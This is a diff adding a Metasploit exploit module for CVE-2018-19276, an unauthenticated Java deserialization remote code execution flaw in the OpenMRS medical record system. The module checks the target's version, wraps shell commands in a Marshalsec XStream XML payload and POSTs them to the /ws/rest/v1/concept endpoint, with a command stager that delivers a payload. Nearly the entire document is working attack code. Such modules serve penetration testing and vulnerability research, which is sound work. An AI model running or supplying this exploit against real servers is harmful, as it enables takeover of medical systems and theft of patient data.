@@ -1,0 +1,133 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'OpenMRS Java Deserialization RCE',
+      'Description'    => %q(
+        OpenMRS is an open-source platform that supplies
+        users with a customizable medical record system.
+
+        There exists an object deserialization vulnerability
+        in the `webservices.rest` module used in OpenMRS Platform.
+        Unauthenticated remote code execution can be achieved
+        by sending a malicious XML payload to a Rest API endpoint
+        such as `/ws/rest/v1/concept`.
+
+        This module uses an XML payload generated with Marshalsec
+        that targets the ImageIO component of the XStream library.
+
+        Tested on OpenMRS Platform `v2.1.2` and `v2.21` with Java
+        8 and Java 9.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Nicolas Serra', # Vuln Discovery and PoC
+        'mpgn',          # PoC
+        'Shelby Pace'    # Metasploit Module
+      ],
+      'References'     =>
+       [
+         [ 'CVE', '2018-19276' ],
+         [ 'URL', 'https://talk.openmrs.org/t/critical-security-advisory-cve-2018-19276-2019-02-04/21607' ],
+         [ 'URL', 'https://know.bishopfox.com/advisories/news/2019/02/openmrs-insecure-object-deserialization' ],
+         [ 'URL', 'https://github.com/mpgn/CVE-2018-19276/' ]
+       ],
+      'Platform'       => [ 'unix', 'linux' ],
+      'Arch'           => [ ARCH_X86, ARCH_X64 ],
+      'Targets'        =>
+       [
+         [ 'Linux',
+           {
+             'Arch'             =>  [ ARCH_X86, ARCH_X64 ],
+             'Platform'         =>  [ 'unix', 'linux' ],
+             'CmdStagerFlavor'  => 'printf'
+           }
+         ]
+       ],
+      'DisclosureDate' => '2019-02-04',
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+    [
+      Opt::RPORT(8081),
+      OptString.new('TARGETURI', [ true, 'Base URI for OpenMRS', '/' ])
+    ])
+
+    register_advanced_options([ OptBool.new('ForceExploit', [ false, 'Override check result', false ]) ])
+  end
+
+  def check
+    res = send_request_cgi!('method' => 'GET', 'uri' => normalize_uri(target_uri.path))
+    return CheckCode::Unknown("OpenMRS page unreachable.") unless res
+
+    return CheckCode::Safe('Page discovered is not OpenMRS.') unless res.body.downcase.include?('openmrs')
+    response = res.get_html_document
+    version = response.at('body//h3')
+    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version && version.text
+
+    version_no = version.text
+    version_no = version_no.match(/\d+\.\d+\.\d*/)
+    return CheckCode::Detected('Successfully identified OpenMRS, but cannot detect version') unless version_no
+
+    version_no = Gem::Version.new(version_no)
+
+    if (version_no < Gem::Version.new('1.11.8') || version_no.between?(Gem::Version.new('2'), Gem::Version.new('2.1.3')))
+      return CheckCode::Appears("OpenMRS platform version: #{version_no}")
+    end
+
+    CheckCode::Safe
+  end
+
+  def format_payload
+    payload_data = payload.encoded.to_s.encode(xml: :text)
+    payload_arr = payload_data.split(' ', 3)
+    payload_arr.map { |arg| "<string>#{arg}</string>" }.join.gsub("'", "")
+  end
+
+  def read_payload_data(payload_cmd)
+    # payload generated with Marshalsec
+    erb_path = File.join(Msf::Config.data_directory, 'exploits', 'CVE-2018-19276', 'payload.erb')
+    payload_data = File.binread(erb_path)
+    payload_data = ERB.new(payload_data).result(binding)
+
+  rescue Errno::ENOENT
+    fail_with(Failure::NotFound, "Failed to find erb file at the given path: #{erb_path}")
+  end
+
+  def execute_command(cmd, opts={})
+    cmd = cmd.encode(xml: :text)
+    xml_data = "<string>sh</string><string>-c</string><string>#{cmd}</string>"
+    rest_uri = normalize_uri(target_uri.path, 'ws', 'rest', 'v1', 'concept')
+    payload_data = read_payload_data(xml_data)
+
+    send_request_cgi(
+      'method'    =>  'POST',
+      'uri'       =>  rest_uri,
+      'headers'   =>  { 'Content-Type'  =>  'text/xml' },
+      'data'      =>  payload_data
+    )
+  end
+
+  def exploit
+    chk_status = check
+    print_status('Target is running OpenMRS') if chk_status == CheckCode::Appears
+    unless ((chk_status == CheckCode::Appears || chk_status == CheckCode::Detected) || datastore['ForceExploit'] )
+      fail_with(Failure::NoTarget, 'Target is not vulnerable')
+    end
+
+    cmds = generate_cmdstager(:concat_operator => '&&')
+    print_status('Sending payload...')
+    cmds.first.split('&&').map { |cmd| execute_command(cmd) }
+  end
+end
